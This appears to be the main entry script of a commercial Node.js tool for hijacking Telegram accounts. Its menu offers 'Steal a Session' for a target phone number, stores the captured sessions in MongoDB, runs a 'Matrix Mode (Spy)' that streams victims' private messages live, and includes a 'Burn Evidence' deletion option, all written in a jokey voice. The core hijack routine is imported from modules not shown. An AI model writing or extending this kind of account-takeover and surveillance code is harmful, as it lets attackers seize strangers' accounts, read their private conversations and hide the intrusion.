const { renderTitle, sexyBox, crazyLoader, sleep } = require('./src/visuals');
const { vibeCheck, getMachineSoul } = require('./src/security');
const { penetrateCloud, buryBody, digUpBodies, burnBody } = require('./src/storage');
const { WarMachine } = require('./src/engine');
const ConfigStore = require('configstore');
const { Select, Input } = require('enquirer');
const chalk = require('chalk');

const conf = new ConfigStore('mika_v69');

const init = async () => {
    renderTitle();
    
    const check = await vibeCheck();
    if (!check.passed) {
        sexyBox('GTFO', `License Check Failed.\n${check.msg}\nHWID: ${getMachineSoul()}`, 'bad');
        process.exit(1);
    }
    
    await crazyLoader(`Verifying Soul Contract for ${check.owner}...`);

    let mongo = conf.get('db_string');
    if (!mongo) {
        sexyBox('SETUP', 'I need a MongoDB URL. Don\'t give me a broken one.', 'info');
        const prompt = new Input({ message: 'Mongo URI:' });
        mongo = await prompt.run();
        conf.set('db_string', mongo);
    }

    if (!(await penetrateCloud(mongo))) {
        sexyBox('WTF', 'Database connection refused. Did you pay the internet bill?', 'bad');
        conf.delete('db_string');
        process.exit(1);
    }

    let apiId = conf.get('tg_id');
    let apiHash = conf.get('tg_hash');
    
    if (!apiId || !apiHash) {
        console.log(chalk.yellow('\n--- TELEGRAM CREDENTIALS NEEDED ---'));
        const p1 = new Input({ message: 'API ID (Numbers only):' });
        apiId = await p1.run();
        const p2 = new Input({ message: 'API Hash:' });
        apiHash = await p2.run();
        conf.set('tg_id', apiId);
        conf.set('tg_hash', apiHash);
    }

    const engine = new WarMachine(apiId, apiHash);
    return engine;
};

const main = async () => {
    const engine = await init();
    
    while (true) {
        renderTitle();
        
        const prompt = new Select({
            name: 'action',
            message: 'What do we do today, boss?',
            choices: [
                '1. Steal a Session (Login)',
                '2. Check the Graveyard (List)',
                '3. Matrix Mode (Spy)',
                '4. Burn Evidence (Delete)',
                '5. Who am I?',
                '6. Rage Quit'
            ]
        });

        const answer = await prompt.run();

        if (answer.includes('1.')) {
            const p = new Input({ message: 'Target Number (+123...):' });
            const phone = await p.run();
            try {
                console.log(chalk.blue('Sending authentication payload...'));
                const { session, me } = await engine.hijack(phone);
                await buryBody(phone, session, me);
                sexyBox('BOOM', `We got 'em.\nUser: ${me.username}\nID: ${me.id}`, 'good');
            } catch (e) {
                sexyBox('FAIL', `Mission aborted. ${e.message}`, 'bad');
            }
        } 
        else if (answer.includes('2.')) {
            const bodies = await digUpBodies();
            if (bodies.length === 0) {
                console.log(chalk.gray('  It\'s empty in here. Go catch some pokemons.'));
            } else {
                bodies.forEach((b, i) => {
                    console.log(chalk.cyan(`  [${i+1}] ${b.phone} | ${b.username} | ${b.uid}`));
                });
            }
        }
        else if (answer.includes('3.')) {
            const bodies = await digUpBodies();
            if (bodies.length === 0) {
                console.log(chalk.red('  No sessions to monitor. Are you stupid?'));
            } else {
                renderTitle();
                console.log(chalk.green('--- ENTERING MATRIX ---'));
                console.log(chalk.gray('Press Ctrl+C to stop being a creep.'));
                
                await engine.wakeUpNeo(bodies, (msg) => {
                    const tag = chalk.bgBlue.white(` ${msg.phone} `);
                    const txt = chalk.white(msg.text.replace(/\n/g, ' '));
                    console.log(`${tag} ${chalk.yellow(msg.sender)}: ${txt.substring(0, 60)}...`);
                });
                
                await new Promise(() => {}); 
            }
        }
        else if (answer.includes('4.')) {
            const bodies = await digUpBodies();
            const list = bodies.map(b => b.phone);
            if (list.length === 0) {
                console.log(chalk.red('  Nothing to delete.'));
            } else {
                const delPrompt = new Select({
                    message: 'Who dies today?',
                    choices: [...list, 'Cancel']
                });
                const target = await delPrompt.run();
                if (target !== 'Cancel') {
                    await burnBody(target);
                    console.log(chalk.red(`  ${target} has been obliterated.`));
                }
            }
        }
        else if (answer.includes('5.')) {
            renderTitle();
            console.log(chalk.bold.hex('#DEADED')(`
    THE ARCHITECT
    =============
    
    Reinhart
    --------
    Telegram: @kiri0507
    Instagram: @reinhart.dev
    
    "We do not do it because it's easy.
     We do it because we thought it would be easy."
     
    About Jules:
    Born in a hackathon, fueled by coffee and bad life choices.
    Built this because standard tools are boring as f*ck.
    
    If it breaks, it's a feature.
    If it works, it was definitely an accident.
            `));
        }
        else {
            console.log(chalk.magenta('  Late night? Go sleep.'));
            process.exit(0);
        }

        if (!answer.includes('3.')) {
            await new Input({ message: 'Press Enter to reload...' }).run();
        }
    }
};

main().catch(err => {
    console.log(chalk.bgRed.white(' CRITICAL FAILURE '));
    console.log(err);
});
